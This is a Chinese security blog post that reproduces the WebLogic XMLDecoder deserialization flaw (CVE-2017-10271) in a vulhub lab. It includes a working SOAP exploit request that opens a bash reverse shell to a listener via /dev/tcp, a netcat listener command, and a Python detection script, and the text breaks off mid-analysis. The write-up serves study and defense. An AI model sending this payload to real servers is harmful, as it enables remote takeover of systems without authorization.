<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="漏洞介绍Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。攻击者发送精心构造的xml数据甚至能通过反弹shell拿到权限。 漏洞涉及版本10.3.6.012.1.3.0.012.2.1.1.0 漏洞地址： 12345678&#x2F;wls-wsat&#x2F;Coordinat">
<meta property="og:type" content="article">
<meta property="og:title" content="【CVE复现】WebLogic XMLDecoder反序列化漏洞(CVE-2017-10271)漏洞复现">
<meta property="og:url" content="https://godreams.cn/2024/10/22/WebSecurity/cve/CVE-2017-10271/index.html">
<meta property="og:site_name" content="g0dam">
<meta property="og:description" content="漏洞介绍Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。攻击者发送精心构造的xml数据甚至能通过反弹shell拿到权限。 漏洞涉及版本10.3.6.012.1.3.0.012.2.1.1.0 漏洞地址： 12345678&#x2F;wls-wsat&#x2F;Coordinat">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://godreams.cn/2024/10/22/WebSecurity/cve/CVE-2017-10271/image.png">
<meta property="og:image" content="https://godreams.cn/2024/10/22/WebSecurity/cve/CVE-2017-10271/image-1.png">
<meta property="og:image" content="https://godreams.cn/2024/10/22/WebSecurity/cve/CVE-2017-10271/image-2.png">
<meta property="og:image" content="https://godreams.cn/2024/10/22/WebSecurity/cve/CVE-2017-10271/image-3.png">
<meta property="og:image" content="https://godreams.cn/2024/10/22/WebSecurity/cve/CVE-2017-10271/image-4.png">
<meta property="og:image" content="https://godreams.cn/2024/10/22/WebSecurity/cve/CVE-2017-10271/image-5.png">
<meta property="article:published_time" content="2024-10-22T12:48:58.000Z">
<meta property="article:modified_time" content="2024-10-23T02:23:23.715Z">
<meta property="article:author" content="g0dam">
<meta property="article:tag" content="CVE">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://godreams.cn/2024/10/22/WebSecurity/cve/CVE-2017-10271/image.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>【CVE复现】WebLogic XMLDecoder反序列化漏洞(CVE-2017-10271)漏洞复现</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
      <link rel="alternate" href="/true" title="g0dam" type="application/atom+xml" />
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/categories/">Categories</a></li><!--
     --><!--
       --><li><a href="/idea/">Idea</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/g0dam">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2024/10/23/tools/burpsuite-plugins/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2024/10/22/algorithm/stackandqueue/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://godreams.cn/2024/10/22/WebSecurity/cve/CVE-2017-10271/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://godreams.cn/2024/10/22/WebSecurity/cve/CVE-2017-10271/&text=【CVE复现】WebLogic XMLDecoder反序列化漏洞(CVE-2017-10271)漏洞复现"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://godreams.cn/2024/10/22/WebSecurity/cve/CVE-2017-10271/&title=【CVE复现】WebLogic XMLDecoder反序列化漏洞(CVE-2017-10271)漏洞复现"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://godreams.cn/2024/10/22/WebSecurity/cve/CVE-2017-10271/&is_video=false&description=【CVE复现】WebLogic XMLDecoder反序列化漏洞(CVE-2017-10271)漏洞复现"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=【CVE复现】WebLogic XMLDecoder反序列化漏洞(CVE-2017-10271)漏洞复现&body=Check out this article: https://godreams.cn/2024/10/22/WebSecurity/cve/CVE-2017-10271/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://godreams.cn/2024/10/22/WebSecurity/cve/CVE-2017-10271/&title=【CVE复现】WebLogic XMLDecoder反序列化漏洞(CVE-2017-10271)漏洞复现"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://godreams.cn/2024/10/22/WebSecurity/cve/CVE-2017-10271/&title=【CVE复现】WebLogic XMLDecoder反序列化漏洞(CVE-2017-10271)漏洞复现"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://godreams.cn/2024/10/22/WebSecurity/cve/CVE-2017-10271/&title=【CVE复现】WebLogic XMLDecoder反序列化漏洞(CVE-2017-10271)漏洞复现"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://godreams.cn/2024/10/22/WebSecurity/cve/CVE-2017-10271/&title=【CVE复现】WebLogic XMLDecoder反序列化漏洞(CVE-2017-10271)漏洞复现"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://godreams.cn/2024/10/22/WebSecurity/cve/CVE-2017-10271/&name=【CVE复现】WebLogic XMLDecoder反序列化漏洞(CVE-2017-10271)漏洞复现&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://godreams.cn/2024/10/22/WebSecurity/cve/CVE-2017-10271/&t=【CVE复现】WebLogic XMLDecoder反序列化漏洞(CVE-2017-10271)漏洞复现"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">漏洞介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">4.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95"><span class="toc-number">5.</span> <span class="toc-text">动态调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Payload"><span class="toc-number">6.</span> <span class="toc-text">Payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90"><span class="toc-number">7.</span> <span class="toc-text">补丁分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A0%B9%E6%BA%90"><span class="toc-number">8.</span> <span class="toc-text">漏洞根源</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        【CVE复现】WebLogic XMLDecoder反序列化漏洞(CVE-2017-10271)漏洞复现
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">g0dam</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-10-22T12:48:58.000Z" class="dt-published" itemprop="datePublished">2024-10-22</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/Web-Security/">Web Security</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/CVE/" rel="tag">CVE</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。攻击者发送精心构造的xml数据甚至能通过反弹shell拿到权限。</p>
<p>漏洞涉及版本<br>10.3.6.0<br>12.1.3.0.0<br>12.2.1.1.0</p>
<p>漏洞地址：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/wls-wsat/CoordinatorPortType</span><br><span class="line">/wls-wsat/RegistrationPortTypeRPC</span><br><span class="line">/wls-wsat/ParticipantPortType</span><br><span class="line">/wls-wsat/RegistrationRequesterPortType</span><br><span class="line">/wls-wsat/CoordinatorPortType11</span><br><span class="line">/wls-wsat/RegistrationPortTypeRPC11</span><br><span class="line">/wls-wsat/ParticipantPortType11</span><br><span class="line">/wls-wsat/RegistrationRequesterPortType11</span><br></pre></td></tr></table></figure>

<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>用的vulhub，为了动态分析cve的原理，用IDEA的远程调试搞一下，首先修改下<code>docker-compose.yml</code>文件，添加调试端口</p>
<figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;2&#x27;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"> <span class="attr">weblogic:</span></span><br><span class="line">   <span class="attr">image:</span> <span class="string">vulhub/weblogic:10.3.6.0-2017</span></span><br><span class="line">   <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;7001:7001&quot;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;8453:8453&quot;</span></span><br></pre></td></tr></table></figure>
<p>docker-compose up -d 编译镜像并启动容器<br><img src="/2024/10/22/WebSecurity/cve/CVE-2017-10271/image.png"><br>docker exec -it 4d &#x2F;bin&#x2F;bash 进入容器内，<code>vi /root/Oracle/Middleware/user_projects/domains/base_domain/bin/setDomainEnv.sh</code>，<br><img src="/2024/10/22/WebSecurity/cve/CVE-2017-10271/image-1.png"><br>之后将docker中的项目文件cp出来，添加在IDEA项目中，在debug配置中添加远程调试</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>使用了网上exp，成功getshell，首先在主机监听：<code>nc -l -p 9999</code>，之后使用burp修改下面的数据包</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/wls-wsat/CoordinatorPortType</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:7001</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/xml</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>639</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.4.0&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                    <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                            <span class="tag">&lt;<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                                /bin/bash</span></span><br><span class="line"><span class="language-xml">                            <span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                            <span class="tag">&lt;<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                                -c</span></span><br><span class="line"><span class="language-xml">                            <span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                            <span class="tag">&lt;<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                                bash -i &gt;&amp; /dev/tcp/192.168.0.32/9999 0&gt;&amp;1</span></span><br><span class="line"><span class="language-xml">                            <span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                    <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                    <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;/<span class="name">java</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>成功反弹shell<br><img src="/2024/10/22/WebSecurity/cve/CVE-2017-10271/image-2.png" alt="其中 ns2:frame 标签中打印出的是调用栈信息"></p>
<p>Payload解析<br>SOAP 请求结构</p>
<ul>
<li><strong>Envelope</strong>: 定义了 SOAP 消息的外层结构，使用的是标准的 SOAP Envelope 命名空间。</li>
<li><strong>Header</strong>: SOAP 消息中用来包含头部信息，这里特别使用了 <code>WorkContext</code>，这是 WebLogic Server 特有的机制，用于在 SOAP 请求中传递上下文或状态信息。</li>
</ul>
<p>WorkContext 内容</p>
<ul>
<li><strong>XMLDecoder</strong>: 利用 Java 的 <code>java.beans.XMLDecoder</code> 类来反序列化 XML 中定义的 Java 对象。由于 XMLDecoder 可以实例化任何 Java 对象，因此它被用于执行恶意代码。</li>
</ul>
<p>恶意代码执行流程</p>
<ol>
<li><strong>ProcessBuilder</strong>: 使用 <code>java.lang.ProcessBuilder</code>，这是 Java 中用于创建操作系统进程的 API。</li>
<li><strong>数组构造</strong>: 构造一个字符串数组，用于作为 <code>ProcessBuilder</code> 的参数。这个数组包含了要执行的命令：<ul>
<li><code>/bin/bash</code>: 使用 bash shell。</li>
<li><code>-c</code>: 表示后面的字符串是要运行的命令。</li>
<li><code>bash -i &gt;&amp; /dev/tcp/192.168.0.32/9999 0&gt;&amp;1</code>: 这条命令尝试建立一个反向 shell 连接到 IP 地址为 192.168.0.32 端口 9999 的服务器。这个命令的功能是将当前 shell 的输入输出重定向到一个 TCP 连接，实际上是创建了一个可以远程控制的 shell。</li>
</ul>
</li>
<li><code>&lt;void method=&quot;start&quot;/&gt;</code> - 这行代码调用 <code>ProcessBuilder</code> 的 <code>start()</code> 方法，启动构建的进程，实际上就是执行了上述的 bash 命令。</li>
</ol>
<p>下面是一个漏洞验证脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/xml&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Webogic_XMLDecoder_poc</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="comment">#url=&quot;http://192.168.189.137:7001&quot;</span></span><br><span class="line">    posturl=url+<span class="string">&#x27;/wls-wsat/CoordinatorPortType&#x27;</span></span><br><span class="line">    data = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;soapenv:Header&gt;</span></span><br><span class="line"><span class="string">            &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;java version=&quot;1.6.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;object class=&quot;java.io.PrintWriter&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;string&gt;servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/test.txt&lt;/string&gt;&lt;void method=&quot;println&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;string&gt;xmldecoder_vul_test&lt;/string&gt;&lt;/void&gt;&lt;void method=&quot;close&quot;/&gt;</span></span><br><span class="line"><span class="string">                    &lt;/object&gt;</span></span><br><span class="line"><span class="string">                &lt;/java&gt;</span></span><br><span class="line"><span class="string">            &lt;/work:WorkContext&gt;</span></span><br><span class="line"><span class="string">        &lt;/soapenv:Header&gt;</span></span><br><span class="line"><span class="string">        &lt;soapenv:Body/&gt;</span></span><br><span class="line"><span class="string">    &lt;/soapenv:Envelope&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">     </span><br><span class="line">    <span class="built_in">print</span> (url)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r=requests.post(posturl,data=data,headers=headers,timeout=<span class="number">5</span>)</span><br><span class="line">        geturl=url+<span class="string">&quot;/wls-wsat/test.txt&quot;</span></span><br><span class="line">        <span class="built_in">print</span> (geturl)</span><br><span class="line">        check_result = requests.get(geturl,headers=headers,timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;xmldecoder_vul_test&#x27;</span> <span class="keyword">in</span> check_result.text:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;[+]存在WebLogic WLS远程执行漏洞(CVE-2017-10271)&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;[-]不存在WebLogic WLS远程执行漏洞(CVE-2017-10271)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = <span class="string">&quot;http://192.168.189.137:7001&quot;</span></span><br><span class="line">    Webogic_XMLDecoder_poc(url)</span><br></pre></td></tr></table></figure>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>这里首先将上面的调用栈信息格式化一下</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">S:Envelope</span> <span class="attr">xmlns:S</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">S:Body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">S:Fault</span> <span class="attr">xmlns:ns4</span>=<span class="string">&quot;http://www.w3.org/2003/05/soap-envelope&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">faultcode</span>&gt;</span></span><br><span class="line">                S:Server</span><br><span class="line">            <span class="tag">&lt;/<span class="name">faultcode</span>&gt;</span>            <span class="tag">&lt;<span class="name">faultstring</span>&gt;</span></span><br><span class="line">                0</span><br><span class="line">            <span class="tag">&lt;/<span class="name">faultstring</span>&gt;</span>            <span class="tag">&lt;<span class="name">detail</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">ns2:exception</span> <span class="attr">xmlns:ns2</span>=<span class="string">&quot;http://jax-ws.dev.java.net/&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ArrayIndexOutOfBoundsException&quot;</span> <span class="attr">note</span>=<span class="string">&quot;To disable this feature, set com.sun.xml.ws.fault.SOAPFaultBuilder.disableCaptureStackTrace system property to false&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">message</span>&gt;</span></span><br><span class="line">                        0</span><br><span class="line">                    <span class="tag">&lt;/<span class="name">message</span>&gt;</span>                    <span class="tag">&lt;<span class="name">ns2:stackTrace</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span 